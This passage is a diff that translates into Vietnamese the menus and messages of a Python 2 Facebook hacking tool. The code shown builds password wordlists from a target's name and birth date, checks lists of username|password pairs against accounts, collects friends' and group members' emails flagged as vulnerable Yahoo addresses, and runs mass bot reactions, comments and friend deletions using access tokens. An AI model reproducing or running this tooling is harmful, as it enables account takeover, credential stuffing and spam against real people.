 	mitchy = json.loads(friends.text)
 	save = open('out/groupMailVuln.txt','w')
@@ -1785,8 +1786,8 @@ def yahoomember():
 			pass
 	print 42*"\033[1;97m═"
 	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
-	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(sucessful))
-	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/groupMailVuln.txt"
+	print"\033[1;91m[+] \033[1;92mToàn bộ \033[1;91m: \033[1;97m"+str(len(sucessful))
+	print"\033[1;91m[+] \033[1;92mFile đã lưu \033[1;91m:\033[1;97m out/groupMailVuln.txt"
 	save.close()
 	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 	menu_yahoo()
@@ -1798,7 +1799,7 @@ def yahoolist():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -1813,7 +1814,7 @@ def yahoolist():
 		total = open(files,"r")
 		mail = total.readlines()
 	except IOError:
-		print"\033[1;91m[!] File not found"
+		print"\033[1;91m[!] Không tìm thấy  file"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu_yahoo()
 	mpsh = []
@@ -1845,8 +1846,8 @@ def yahoolist():
 				sucessful.append(mail)
 	print 42*"\033[1;97m═"
 	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
-	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(sucessful))
-	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/FileMailVuln.txt"
+	print"\033[1;91m[+] \033[1;92mToàn bộ \033[1;91m: \033[1;97m"+str(len(sucessful))
+	print"\033[1;91m[+] \033[1;92mFile đã lưu \033[1;91m:\033[1;97m out/FileMailVuln.txt"
 	save.close()
 	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 	menu_yahoo()
@@ -1860,19 +1861,19 @@ def menu_bot():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Bot Reactions Target Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Bot Reactions group Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m BOT COMMENT Target Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m BOT COMMENT group Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Mass delete Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Mass accept friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Mass delete friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Bài đăng mục tiêu về phản ứng của bot"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Bot phản ứng bài đăng group"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m BOT COMMENT Bai Viết"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m BOT COMMENT Bài viết nhóm"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Xóa hàng loạt bài đăng"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Chấp Nhận Bạn Bè Hàng Loạt"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Xóa hàng loạt bạn bè"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
 	print "║"
 	choose_bot()
@@ -1880,7 +1881,7 @@ def menu_bot():
 def choose_bot():
 	bots = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
 	if bots =="":
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] Nhập sai"
 		choose_bot()
 	elif bots =="1":
 		menu_react()
@@ -1899,7 +1900,7 @@ def choose_bot():
 	elif bots =="0":
 		menu()
 	else:
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] Nhập sai"
 		choose_bot()
 
 ##### MENU REACT #####
@@ -1908,7 +1909,7 @@ def menu_react():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -1928,7 +1929,7 @@ def choose_reaction():
 	global tipe
 	action = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
 	if action =="":
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] Nhập sai"
 		choose_reaction()
 	elif action =="1":
 		tipe = "LIKE"
@@ -1951,7 +1952,7 @@ def choose_reaction():
 	elif action =="0":
 		menu_bot()
 	else:
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] Nhập sai"
 		choose_reaction()
 #####NEXT
 def react():
@@ -1959,14 +1960,14 @@ def react():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
 	os.system('clear')
 	print logo
-	ide = raw_input('\033[1;91m[+] \033[1;92mInput ID Target \033[1;91m:\033[1;97m ')
-	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
+	ide = raw_input('\033[1;91m[+] \033[1;92mNhập ID Target \033[1;91m:\033[1;97m ')
+	limit = raw_input("\033[1;91m[!] \033[1;92mGiới hạn \033[1;91m:\033[1;97m ")
 	try:
 		oh = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+fb_token)
 		ah = json.loads(oh.text)
@@ -1982,7 +1983,7 @@ def react():
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu_bot()
 	except KeyError:
-		print"\033[1;91m[!] ID not found"
+		print"\033[1;91m[!] Không tìm thấy id"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu_bot()
 
@@ -1992,7 +1993,7 @@ def group_react():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -2012,7 +2013,7 @@ def choosing_reaction():
 	global tipe
 	action = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
 	if action =="":
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] Nhập sai"
 		choosing_reaction()
 	elif action =="1":
 		tipe = "LIKE"
@@ -2035,7 +2036,7 @@ def choosing_reaction():
 	elif action =="0":
 		menu_bot()
 	else:
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] Nhập sai"
 		choosing_reaction()
 #####NEXT
 def reactg():
@@ -2043,20 +2044,20 @@ def reactg():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
 	os.system('clear')
 	print logo
-	ide = raw_input('\033[1;91m[+] \033[1;92mInput ID Group \033[1;91m:\033[1;97m ')
-	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
+	ide = raw_input('\033[1;91m[+] \033[1;92mNhập id group \033[1;91m:\033[1;97m ')
+	limit = raw_input("\033[1;91m[!] \033[1;92mlimit \033[1;91m:\033[1;97m ")
 	try:
 		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+fb_token)
 		asw=json.loads(r.text)
-		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTừ Group \033[1;91m:\033[1;97m "+asw['name']
 	except KeyError:
-		print"\033[1;91m[!] Group not found"
+		print"\033[1;91m[!] Không tìm thấy group"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		group_react()
 	try:
@@ -2074,7 +2075,7 @@ def reactg():
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu_bot()
 	except KeyError:
-		print"\033[1;91m[!] ID not found"
+		print"\033[1;91m[!] Không tìm thấy id"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu_bot()
 
@@ -2084,13 +2085,13 @@ def bot_comment():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;91m[!] \033[1;92mUse \033[1;97m'<>' \033[1;92mfor new lines"
+	print "\033[1;91m[!] \033[1;92mSử dụng \033[1;97m'<>' \033[1;92mCác dòng mới"
 	ide = raw_input('\033[1;91m[+] \033[1;92mID Target \033[1;91m:\033[1;97m ')
 	km = raw_input('\033[1;91m[+] \033[1;92mComment \033[1;91m:\033[1;97m ')
 	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
@@ -2110,7 +2111,7 @@ def bot_comment():
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu_bot()
 	except KeyError:
-		print"\033[1;91m[!] ID not found"
+		print"\033[1;91m[!] Không tìm thấy id"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu_bot()
 
@@ -2120,13 +2121,13 @@ def group_comment():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;91m[!] \033[1;92mUse \033[1;97m'<>' \033[1;92mfor new lines"
+	print "\033[1;91m[!] \033[1;92mSử dụng \033[1;97m'<>' \033[1;92mcác dòng mới"
 	ide = raw_input('\033[1;91m[+] \033[1;92mID Group  \033[1;91m:\033[1;97m ')
 	km = raw_input('\033[1;91m[+] \033[1;92mComment \033[1;91m:\033[1;97m ')
 	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
@@ -2134,9 +2135,9 @@ def group_comment():
 	try:
 		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+fb_token)
 		asw=json.loads(r.text)
-		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTừ Group \033[1;91m:\033[1;97m "+asw['name']
 	except KeyError:
-		print"\033[1;91m[!] Group not found"
+		print"\033[1;91m[!] Không tìm thấy group"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu_bot()
 	try:
@@ -2167,13 +2168,13 @@ def deletepost():
 		lol = json.loads(nam.text)
 		fb_name = lol['name']
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
 	os.system('clear')
 	print logo
-	print("\033[1;91m[+] \033[1;92mFrom \033[1;91m: \033[1;97m%s"%fb_name)
+	print("\033[1;91m[+] \033[1;92mTừ \033[1;91m: \033[1;97m%s"%fb_name)
 	mkdir("\033[1;91m[+] \033[1;92mStart\033[1;97m ...")
 	print 42*"\033[1;97m═"
 	asu = requests.get('https://graph.facebook.com/me/feed?access_token='+fb_token)
@@ -2190,7 +2191,7 @@ def deletepost():
 			print '\033[1;92m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;92m] \033[1;96mDeleted'
 			piro += 1
 		except requests.exceptions.ConnectionError:
-			print"\033[1;91m[!] Connection Error"
+			print"\033[1;91m[!] Lỗi kết nối"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 			menu_bot()
 	print 42*"\033[1;97m═"
@@ -2204,7 +2205,7 @@ def accept():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -2214,7 +2215,7 @@ def accept():
 	r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+fb_token)
 	friends = json.loads(r.text)
 	if '[]' in str(friends['data']):
-		print"\033[1;91m[!] No friend request"
+		print"\033[1;91m[!] Không có yêu cầu kết bạn"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu_bot()
 	mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
@@ -2223,9 +2224,9 @@ def accept():
 		gas = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+fb_token)
 		a = json.loads(gas.text)
 		if 'error' in str(a):
-			print "\033[1;97m[ \033[1;91mFailed\033[1;97m ] "+i['from']['name']
+			print "\033[1;97m[ \033[1;91mThất bại\033[1;97m ] "+i['from']['name']
 		else:
-			print "\033[1;97m[ \033[1;92mAccept\033[1;97m ] "+i['from']['name']
+			print "\033[1;97m[ \033[1;92mChấp nhận\033[1;97m ] "+i['from']['name']
 	print 42*"\033[1;97m═"
 	print"\033[1;91m[+] \033[1;92mDone"
 	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
@@ -2237,7 +2238,7 @@ def unfriend():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -2256,7 +2257,7 @@ def unfriend():
 			print "\033[1;97m[\033[1;92m Deleted \033[1;97m] "+fb_name
 	except IndexError: pass
 	except KeyboardInterrupt:
-		print "\033[1;91m[!] Stopped"
+		print "\033[1;91m[!] Đã dừng lại"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu_bot()
 	print"\n\033[1;91m[+] \033[1;92mDone"
@@ -2271,17 +2272,17 @@ def func():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Create Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Create Wordlist"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Tạo Bài viết"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Tạo danh sách từ"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Account Checker"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m See my group list"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Profile Guard"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Xem danh sách nhóm"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Bảo vệ trang cá nhân"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
 	print "║"
 	choosing_again()
@@ -2289,7 +2290,7 @@ def func():
 def choosing_again():
 	other = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
 	if other =="":
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] Nhập sai"
 		choosing_again()
 	elif other =="1":
 		status()
@@ -2304,7 +2305,7 @@ def choosing_again():
 	elif other =="0":
 		menu()
 	else:
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] Nhập sai"
 		choosing_again()
 
 ##### STATUS #####
@@ -2313,56 +2314,56 @@ def status():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
 	os.system('clear')
 	print logo
-	msg=raw_input('\033[1;91m[+] \033[1;92mType status \033[1;91m:\033[1;97m ')
+	msg=raw_input('\033[1;91m[+] \033[1;92mLoại trạng thái \033[1;91m:\033[1;97m ')
 	if msg == "":
-		print "\033[1;91m[!] Don't be empty"
+		print "\033[1;91m[!] Đừng để trống"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		func()
 	else:
 		res = requests.get("https://graph.facebook.com/me/feed?method=POST&message="+msg+"&access_token="+fb_token)
 		op = json.loads(res.text)
-		mkdir('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
+		mkdir('\033[1;91m[✺] \033[1;92mTạo \033[1;97m...')
 		print 42*"\033[1;97m═"
 		print"\033[1;91m[+] \033[1;92mStatus ID\033[1;91m : \033[1;97m"+op['id']
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		func()
 
-########### CREATE WORDLIST ##########
+########### Tạo danh sách từ ##########
 def wordlist():
 	os.system('clear')
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
 	try:
 		os.system('clear')
 		print logo
-		print "\033[1;91m[?] \033[1;92mFill in the complete data of the target below"
+		print "\033[1;91m[?] \033[1;92mĐiền vào dữ liệu đầy đủ của mục tiêu bên dưới"
 		print 42*"\033[1;97m═"
-		a = raw_input("\033[1;91m[+] \033[1;92mfb_name first \033[1;97m: ")
+		a = raw_input("\033[1;91m[+] \033[1;92mDanh sách tên fb \033[1;97m: ")
 		file = open(a+".txt", 'w')
-		b=raw_input("\033[1;91m[+] \033[1;92mfb_name middle \033[1;97m: ")
-		c=raw_input("\033[1;91m[+] \033[1;92mfb_name last \033[1;97m: ")
+		b=raw_input("\033[1;91m[+] \033[1;92mfb_name dữa \033[1;97m: ")
+		c=raw_input("\033[1;91m[+] \033[1;92mfb_name cuối cùng \033[1;97m: ")
 		d=raw_input("\033[1;91m[+] \033[1;92mfb_name nicke \033[1;97m: ")
-		e=raw_input("\033[1;91m[+] \033[1;92mDate of birth >\033[1;96mex: |DDMMYY| \033[1;97m: ")
+		e=raw_input("\033[1;91m[+] \033[1;92mNgày sinh >\033[1;96mex: |Ngày/thánh/năm| \033[1;97m: ")
 		f=e[0:2]
 		g=e[2:4]
 		h=e[4:]
 		print 42*"\033[1;97m═"
-		print("\033[1;91m[?] \033[1;93mcreate wordlist :v")
-		i=raw_input("\033[1;91m[+] \033[1;92mfb_name first \033[1;97m: ")
-		j=raw_input("\033[1;91m[+] \033[1;92mfb_name last \033[1;97m: ")
-		k=raw_input("\033[1;91m[+] \033[1;92mdate of birth >\033[1;96mex: |DDMMYY| \033[1;97m: ")
-		mkdir('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
+		print("\033[1;91m[?] \033[1;93mTạo danh sách từ :v")
+		i=raw_input("\033[1;91m[+] \033[1;92mfb_name đầu tiên \033[1;97m: ")
+		j=raw_input("\033[1;91m[+] \033[1;92mfb_name cuối cùng \033[1;97m: ")
+		k=raw_input("\033[1;91m[+] \033[1;92mNgày sing >\033[1;96mex: |ngày/tháng/năm| \033[1;97m: ")
+		mkdir('\033[1;91m[✺] \033[1;92mTạo \033[1;97m...')
 		l=k[0:2]
 		m=k[2:4]
 		n=k[4:]
@@ -2390,7 +2391,7 @@ def wordlist():
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		func()
 	except IOError, e:
-		print("\033[1;91m[!] Failed")
+		print("\033[1;91m[!] Thất bại")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		func()
 
@@ -2400,25 +2401,25 @@ def check_akun():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;91m[?] \033[1;92mCreate in file\033[1;91m : \033[1;97musername|password"
+	print "\033[1;91m[?] \033[1;92mTạo trong tệp\033[1;91m : \033[1;97musername|password"
 	print 42*"\033[1;97m═"
 	live = []
 	check_it = []
 	die = []
 	try:
-		file = raw_input("\033[1;91m[+] \033[1;92mFile path \033[1;91m:\033[1;97m ")
+		file = raw_input("\033[1;91m[+] \033[1;92mĐường dẫn tập tin \033[1;91m:\033[1;97m ")
 		list = open(file,'r').readlines()
 	except IOError:
-		print ("\033[1;91m[!] File not found")
+		print ("\033[1;91m[!] Không tìm thấy  file")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		func()
-	pemisah = raw_input("\033[1;91m[+] \033[1;92mSeparator \033[1;91m:\033[1;97m ")
+	pemisah = raw_input("\033[1;91m[+] \033[1;92mDấu phân cách \033[1;91m:\033[1;97m ")
 	mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
 	print 42*"\033[1;97m═"
 	for meki in list:
@@ -2446,7 +2447,7 @@ def group_list():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -2465,27 +2466,27 @@ def group_list():
 			f=open('out/groupid.txt','w')
 			listgroup.append(id)
 			f.write(id + '\n')
-			print "\033[1;97m[ \033[1;92mMyGroup\033[1;97m ] "+str(id)+" => "+str(fb_name)
+			print "\033[1;97m[ \033[1;92mGroup của bạn\033[1;97m ] "+str(id)+" => "+str(fb_name)
 		print 42*"\033[1;97m═"
-		print"\033[1;91m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgroup))
+		print"\033[1;91m[+] \033[1;92mToàn bộ Group \033[1;91m:\033[1;97m %s"%(len(listgroup))
 		print("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97mout/groupid.txt")
 		f.close()
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		func()
 	except (KeyboardInterrupt,EOFError):
-		print("\033[1;91m[!] Stopped")
+		print("\033[1;91m[!] đã dừng lại")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		func()
 	except KeyError:
 		os.remove('out/groupid.txt')
-		print('\033[1;91m[!] Group not found')
+		print('\033[1;91m[!] Không tìm thấy group')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		func()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;91m[✖] No Connection"
+		print"\033[1;91m[✖] không có kết nối"
 		exit()
 	except IOError:
-		print "\033[1;91m[!] Error"
+		print "\033[1;91m[!] lỗi"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		func()
 
@@ -2496,14 +2497,14 @@ def guard():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Activate"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Not activate"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Kích hoạt"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Không kích hoạt"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
 	print "║"
 	g = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
@@ -2536,17 +2537,17 @@ def jay(fb_token, enable = True):
 	if '"is_shielded":true' in res.text:
 		os.system('clear')
 		print logo
-		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mActivate"
+		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mKích hoạt"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		func()
 	elif '"is_shielded":false' in res.text:
 		os.system('clear')
 		print logo
-		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;91mNot activate"
+		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;91mKhông kích hoạt"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		func()
 	else:
-		print "\033[1;91m[!] Error"
+		print "\033[1;91m[!] Lỗi"
 		exit()
 
 if __name__=='__main__':
